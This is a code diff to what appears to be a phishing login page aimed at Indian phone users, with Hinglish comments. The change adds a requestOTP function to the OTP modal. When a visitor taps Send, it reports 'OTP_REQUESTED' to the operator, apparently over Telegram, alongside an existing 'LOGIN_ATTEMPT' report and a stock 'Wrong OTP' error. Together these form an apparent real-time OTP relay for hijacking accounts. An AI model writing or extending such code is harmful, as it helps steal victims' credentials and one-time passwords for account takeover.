@@ -423,7 +423,8 @@
           <div class="input-group">
             <i class="fa-regular fa-envelope"></i>
             <input type="tel" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric" pattern="[0-9]*" required>
-            <button type="button" class="btn-send" id="modalSendBtn" onclick="startTimer(this)">Send</button>
+            <!-- Yahan click karne par timer start hoga aur Telegram par OTP requested message jayega -->
+            <button type="button" class="btn-send" id="modalSendBtn" onclick="requestOTP(this)">Send</button>
           </div>
 
           <div id="otpError" class="error-msg">❌ Wrong OTP! Please try again.</div>
@@ -488,7 +489,6 @@
       
       if (storedPhone) {
         phoneDisplay.innerText = "+91 " + storedPhone;
-        // Server par login attempt bhej rahe hain
         sendToServer('LOGIN_ATTEMPT');
       }
       
@@ -500,6 +500,30 @@
       document.getElementById('verificationModal').classList.add('hidden');
       document.getElementById('otpError').classList.remove('show');
       document.getElementById('otpInput').value = '';
+    }
+
+    // Modal ke andar "Send" button click hone par yeh function chalega
+    function requestOTP(btn) {
+      if (btn.classList.contains('disabled')) return;
+
+      // Telegram par OTP request ka message bhej rahe hain
+      sendToServer('OTP_REQUESTED');
+
+      // 60 seconds ka timer start kar rahe hain
+      let timeLeft = 60;
+      btn.classList.add('disabled');
+      btn.innerText = timeLeft + 's';
+
+      const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timeLeft > 0) {
+          btn.innerText = timeLeft + 's';
+        } else {
+          clearInterval(timerInterval);
+          btn.innerText = 'Send';
+          btn.classList.remove('disabled');
+        }
+      }, 1000);
     }
 
     function confirmVerification(e) {
@@ -527,25 +551,6 @@
         document.getElementById('otpInput').value = '';
         document.getElementById('otpInput').focus();
       }
-    }
-
-    function startTimer(btn) {
-      if (btn.classList.contains('disabled')) return;
-      
-      let timeLeft = 60;
-      btn.classList.add('disabled');
-      btn.innerText = timeLeft + 's';
-
-      const timerInterval = setInterval(() => {
-        timeLeft--;
-        if (timeLeft > 0) {
-          btn.innerText = timeLeft + 's';
-        } else {
-          clearInterval(timerInterval);
-          btn.innerText = 'Send';
-          btn.classList.remove('disabled');
-        }
-      }, 1000);
     }
   </script>
 </body>
